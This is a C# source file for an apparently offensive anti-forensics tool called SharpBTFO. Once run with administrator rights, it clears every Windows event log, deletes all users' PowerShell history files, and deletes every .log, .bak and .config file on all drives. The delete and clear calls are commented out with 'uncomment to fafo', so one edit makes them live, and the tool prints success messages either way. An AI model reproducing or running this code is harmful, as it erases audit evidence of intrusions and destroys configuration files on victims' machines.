using System;
using System.Linq;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace SharpBTFO
{
    class Program
    {
        static void Main(string[] args)
        {
            bool elevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            if (!elevated)
            {
                Console.WriteLine("You're gonna want to run this elevated...");
                Environment.Exit(0);
            }
            printHeader();
            bool btfo = true;
            try
            {
                EventLog[] eventLogs = EventLog.GetEventLogs();
                foreach (EventLog log in eventLogs)
                {
                    if (log.Entries.Count > 0)
                    {
                        try
                        {
                            //log.Clear();         // <-- uncomment to fafo
                            Console.WriteLine($"[+] Cleared {log.Entries.Count} {log.LogDisplayName} Logs");
                        }
                        catch (Exception ex)
                        {
                            btfo = false;
                            Console.WriteLine($"[!] Error Clearing {log.LogDisplayName} Logs: {ex.Message.Trim()}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                btfo = false;
                Console.WriteLine($"[!] Error Clearing Event Logs: {ex.Message.Trim()}");
            }
            List<string> PSHistory = new List<string>();
            try
            {
                // default path for text file where commands are saved is:
                // C:\Users\{username}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
                Console.WriteLine("[+] Looking for PowerShell History Files");
                string[] users = Directory.GetDirectories(@"C:\Users");
                foreach (string user in users)
                {
                    try
                    {
                        string path = $"{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\";
                        string[] history = Directory.GetFiles(path);
                        foreach (string file in history)
                        {
                            PSHistory.Add(file);
                        }
                    }
                    catch (DirectoryNotFoundException) { /*nothing - some user directories such as 'Public' & 'Default' will not have history files*/ }
                    catch (Exception ex)
                    {
                        btfo = false;
                        Console.WriteLine($"[!] Error Finding PowerShell History: {ex.Message.Trim()}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error Finding PowerShell History: {ex.Message.Trim()}");
            }
            try
            {
                if (PSHistory.Count == 0)
                {
                    Console.WriteLine("[!] No PowerShell Histories Found");
                }
                else
                {
                    int historyCounter = 0;
                    foreach (string history in PSHistory)
                    {
                        try
                        {
                            //Console.WriteLine(history);
                            historyCounter += 1;
                            //File.Delete(history);         // <-- uncomment to fafo
                        }
                        catch (Exception ex)
                        {
                            btfo = false;
                            Console.WriteLine($"[!] Error Deleting PowerShell History: {ex.Message.Trim()}");
                        }
                    }
                    Console.WriteLine($"[+] Deleted {historyCounter} User's PowerShell Histories");
                }
            }
            catch (Exception ex)
            {
                btfo = false;
                Console.WriteLine($"[!] Error Finding PowerShell History: {ex.Message.Trim()}");
            }

            try
            {
                List<string> logs = new List<string>();
                string[] drives = Directory.GetLogicalDrives();
                foreach (string drive in drives)
                {
                    Console.WriteLine($"[+] Finding all .log, .bak, and .config files on {drive}");
                    logs.AddRange(GetAllFilesFromFolder(drive, true));
                }
                Console.WriteLine($"[+] Found {logs.Count} .log, .bak, and .config files");
                Console.WriteLine($"[+] Deleting .log, .bak, and .config files");
                int logCounter = 0;
                foreach (string log in logs)
                {
                    try
                    {
                        //Console.WriteLine(log);
                        //File.Delete(log);         // <-- uncomment to fafo
                        logCounter += 1;
                    }
                    catch (Exception ex)
                    {
                        btfo = false;
                        Console.WriteLine($"[!] Error Deleting File: {log} - {ex.Message.Trim()}");
                    }
                }
                Console.WriteLine($"[+] Deleted {logCounter} .log, .bak, and .config files");
            }
            catch (Exception ex)
            {
                btfo = false;
                Console.WriteLine($"[!] Error finding files by extension: {ex.Message.Trim()}");
            }
            if (btfo)
            {
                printFooter();
            }
        }
        public static List<string> GetAllFilesFromFolder(string root, bool searchSubfolders)
        {
            Queue<string> folders = new Queue<string>();
            List<string> files = new List<string>();
            folders.Enqueue(root);
            while (folders.Count != 0)
            {
                string currentFolder = folders.Dequeue();
                try
                {
                    var filesInCurrent = Directory.EnumerateFiles(currentFolder, "*.*", SearchOption.TopDirectoryOnly).Where(s => s.EndsWith(".log") || s.EndsWith(".bak") || s.EndsWith(".config"));
                    files.AddRange(filesInCurrent);
                }
                catch { /*nothing*/ }
                try
                {
                    if (searchSubfolders)
                    {
                        string[] foldersInCurrent = Directory.GetDirectories(currentFolder, "*.*", SearchOption.TopDirectoryOnly);
                        foreach (string _current in foldersInCurrent)
                        {
                            folders.Enqueue(_current);
                        }
                    }
                }
                catch { /*nothing*/ }
            }
            return files;
        }
        public static void printHeader()
        {
            string banner = @"
                                                         c=====e
                                                            H
                                                            H
       ____________                                      ,,_H__
      (__((__((___()                                    /|     |
     (__((__((___()()                                  / |FAFO |
    (__((__((___()()()________________________________/  |_____|";
            Console.WriteLine(banner);
        }
        public static void printFooter()
        {
            string banner = @"
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |                                        c=====e
       .-=||  | |=-.                                     ,,_H__
       `-=#$%&%$#=-'                                    /|     |
          | ;  :|                                      / |BTFO |
 _____.,-#%&$@%#&#~,._________________________________/  |_____|";
            Console.WriteLine(banner);
        }
    }
}
